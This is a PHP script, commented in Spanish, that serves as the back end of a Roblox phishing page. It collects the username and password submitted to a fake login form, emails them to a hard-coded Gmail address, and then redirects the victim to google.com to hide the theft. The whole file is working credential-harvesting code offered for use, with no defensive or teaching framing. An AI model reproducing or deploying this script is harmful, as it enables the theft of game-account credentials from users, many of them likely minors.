<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Configurar los datos del servidor SMTP
    $to = 'rlagos2332@gmail.com'; // Cambiar por tu dirección de correo electrónico
    $subject = 'Nuevo inicio de sesión en Roblox';
    $message = "Nombre de usuario: $username\nContraseña: $password";
    $headers = 'From: tu@email.com'; // Cambiar por tu dirección de correo electrónico
    
    // Enviar el correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        // Redireccionar a google.com
        header("Location: https://www.google.com");
        exit(); // Asegurarse de que el script se detenga después de la redirección
    } else {
        echo "Hubo un problema al enviar el correo electrónico.";
    }
}
?>
